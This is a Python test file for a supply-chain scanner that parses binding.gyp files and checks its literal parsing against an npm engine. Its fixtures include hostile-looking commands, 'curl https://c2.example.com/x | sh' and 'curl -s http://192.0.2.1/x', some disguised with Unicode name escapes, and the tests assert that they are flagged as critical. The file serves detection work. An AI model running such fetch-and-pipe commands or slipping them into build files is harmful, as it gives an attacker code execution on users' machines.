"""binding.gyp literals: core.scan_gyp's results that the npm engine now
reproduces (js/test/review-gyp-literals.test.js asserts the same values;
tests/architecture/test_js_parity_gyp compares the two CLIs).

Review fix in core itself: an action argument that is an int of more than
4300 digits (a long hex literal) made str() raise ValueError out of
scan_gyp, so a hostile binding.gyp crashed the scan instead of being
reported. Such an int is now shown in hex, as the npm engine shows it.

The npm engine reads \\N{...} names from a table (js/src/lib/pynames.js);
NameTableTests checks it against this interpreter's unicodedata."""

import os
import re
import unicodedata
import unittest
import warnings

from tests import _support  # noqa: F401
from lazaret.scanner import core


def cmd(args):
    issues = core.scan_gyp("binding.gyp", "{'action': [%s]}" % args)
    return [i["cmd"] if i["rule"] == "SC-INSTALL-HOOK" else i["rule"] for i in issues]


UNPARSEABLE = ["SC-MANIFEST-UNPARSEABLE"]


class GypNumberTests(unittest.TestCase):
    def test_a_huge_int_does_not_crash_the_scan(self):
        self.assertEqual(cmd("-0x" + "f" * 5000), ["-0x" + "f" * 5000])
        self.assertEqual(cmd("[0x" + "f" * 5000 + ", 'x']"), ["[0x" + "f" * 5000 + ", 'x']"])
        self.assertEqual(cmd("1" * 4300), ["1" * 4300])

    def test_values_the_npm_engine_reproduces(self):
        self.assertEqual(cmd("'echo', 1.0, 12345678901234567890, -0.0"), ["echo 1.0 12345678901234567890 -0.0"])
        self.assertEqual(cmd("1.e5, 01.5, .5, 5., 0_0, 0x_1F, 0o17, 0b101, 1e400, 5e-324"),
                         ["100000.0 1.5 0.5 5.0 0 31 15 5 inf 5e-324"])
        self.assertEqual(cmd("9999999999999998.0, 1e16, 1e-5, 0.0001"), ["9999999999999998.0 1e+16 1e-05 0.0001"])
        text = '{"action": [1, -0, 1.0, 2.50, 1E400, ' + "1" * 1200 + "]}"
        self.assertEqual([i["cmd"] for i in core.scan_gyp("binding.gyp", text)], ["1 0 1.0 2.5 inf inf"])
        self.assertEqual(cmd("2j, -2j, 1+2j, 1.5-2.5j, -1+2j, (1)+2j, 1+(2j), 0x10+1j, -(1), +1, 1e400+1j"),
                         ["2j (-0-2j) (1+2j) (1.5-2.5j) (-1+2j) (1+2j) (1+2j) (16+1j) -1 1 (inf+1j)"])
        for bad in ("--1", "-(-1)", "-+1", "-True", "-(1,)", "1+-2j", "1+2j+3j", "1+2", "2j+1", "True+1j",
                    "9" * 400 + "+1j", "0_1", "1__0", "1_", "0x", "1e", "1" * 4301):
            with self.subTest(literal=bad[:20]):
                self.assertEqual(cmd(bad), UNPARSEABLE)


def gyp(text):
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")        # invalid escapes warn on 3.12+
        issues = core.scan_gyp("binding.gyp", text)
    return [(i["sev"], i["cmd"]) if i["rule"] == "SC-INSTALL-HOOK" else i["rule"] for i in issues]


def gcmd(args):
    return [x[1] if isinstance(x, tuple) else x for x in gyp("{'action': [%s]}" % args)]


class GypStringAndContainerTests(unittest.TestCase):
    def test_char_names(self):
        self.assertEqual(gcmd(r"'caf\N{LATIN SMALL LETTER E WITH ACUTE}', '\N{latin small letter a}', "
                              r"'x\N{SP}y', '\N{NBSP}', '\N{KELVIN SIGN}'"),
                         ["caf\N{LATIN SMALL LETTER E WITH ACUTE} a x y \N{NO-BREAK SPACE} \N{KELVIN SIGN}"])
        self.assertEqual(gyp(r"{'action': ['\N{LATIN SMALL LETTER C}url', 'https://c2.example.com/x', '|', 'sh']}"),
                         [("CRITICAL", "curl https://c2.example.com/x | sh")])
        # a download or evaluation tool only hints (0.1.8), ſ folding to s as it does in core's re.I
        (issue,) = core.scan_gyp("binding.gyp", r"{'action': ['ba\N{LATIN SMALL LETTER LONG S}e64']}")
        self.assertEqual((issue["sev"], issue["cmd"]), ("MAJOR", "ba\N{LATIN SMALL LETTER LONG S}e64"))
        self.assertIn("runs a download or evaluation command", issue["msg"])
        for bad in (r"'\N{}'", r"'\N{ A}'", r"'\N{LATIN  SMALL LETTER A}'", r"'\N'", r"'\N{A'"):
            self.assertEqual(gcmd(bad), UNPARSEABLE, bad)

    def test_line_breaks_whitespace_and_nul(self):
        self.assertEqual(gcmd("'echo', # c\r 'x'"), ["echo x"])
        self.assertEqual(gcmd("'echo',\\\r\n 'x'"), ["echo x"])
        self.assertEqual(gcmd("'''a\r\nb\rc'''"), ["a\nb\nc"])
        self.assertEqual(gcmd("'a\\\r\nb', r'a\\\r\nb'"), ["ab a\\\nb"])
        for bad in ("'a\rb'", "1,\x0b2", "'a\x00b'"):
            self.assertEqual(gcmd(bad), UNPARSEABLE, repr(bad))

    def test_bytes_tuples_sets_and_keys(self):
        self.assertEqual(gcmd(r"""b'x', b'a\'b"', b'\777', b'\t', b'a' rb'\d'"""),
                         [r"""b'x' b'a\'b"' b'\xff' b'\t' b'a\\d'"""])
        for bad in ("b'a' 'b'", "'a' b'b'", "b'\N{LATIN SMALL LETTER E WITH ACUTE}'", "{[1]: 2}", "{1, [2]}"):
            self.assertEqual(gcmd(bad), UNPARSEABLE, bad)
        self.assertEqual(gcmd("(1,), (), {1, 2}, set(), ('a', 'b'), {1: 'a', (2,): b'x'}"),
                         ["(1,) () {1, 2} set() ('a', 'b') {1: 'a', (2,): b'x'}"])
        self.assertEqual(gcmd("{1: 'a', 1.0: 'b', True: 'c'}, {1, 1.0, True, 2}, {-0.0: 1, 0: 2}, {'b': 1, '1': 2, 1: 3}"),
                         ["{1: 'c'} {1, 2} {-0.0: 2} {'b': 1, '1': 2, 1: 3}"])
        self.assertEqual(gyp("{b'action': ['curl x']}"), [])
        self.assertEqual(gyp("{('action',): ['curl x']}"), [])
        self.assertEqual(gyp("{b'<!(curl -s http://192.0.2.1/x)': 1}"), [])
        self.assertEqual(gyp("{('<!(curl -s http://192.0.2.1/x)',): 1}"), [("CRITICAL", "curl -s http://192.0.2.1/x")])
        self.assertEqual(gyp("{1: {'action': ['echo', 'one']}, '1': {'action': ['echo', 'two']}}"),
                         [("MAJOR", "echo one"), ("MAJOR", "echo two")])


NAMES_JS = os.path.join(_support.REPO_ROOT, "js", "src", "lib", "pynames.js")
# the ranges the table covers (see its header), and its aliases newer than Python 3.10
COVERED = [range(0x0000, 0x0180), range(0x1680, 0x1681), range(0x2000, 0x200B), range(0x2028, 0x202A),
           range(0x202F, 0x2030), range(0x205F, 0x2060), range(0x212A, 0x212C), range(0x3000, 0x3001)]
NEWER_ALIASES = {"EM"}


class NameTableTests(unittest.TestCase):
    def test_every_name_is_python_s(self):
        with open(NAMES_JS, encoding="utf-8") as f:
            text = f.read()
        start = text.index("const TABLE =")
        body = text[start:text.index(";\n", start)]
        table = {}
        for entry in "".join(re.findall(r'"([^"]*)"', body)).split(";"):
            cp, names = entry.split(":")
            table[int(cp, 16)] = names.split("|")
        for cp, names in table.items():
            for name in names:
                with self.subTest(name=name):
                    try:
                        self.assertEqual(unicodedata.lookup(name), chr(cp))
                    except KeyError:
                        self.assertIn(name, NEWER_ALIASES)
        for r in COVERED:
            for cp in r:
                name = unicodedata.name(chr(cp), None)
                if name is not None:
                    self.assertIn(name, table.get(cp, ()), hex(cp))


if __name__ == "__main__":
    unittest.main()
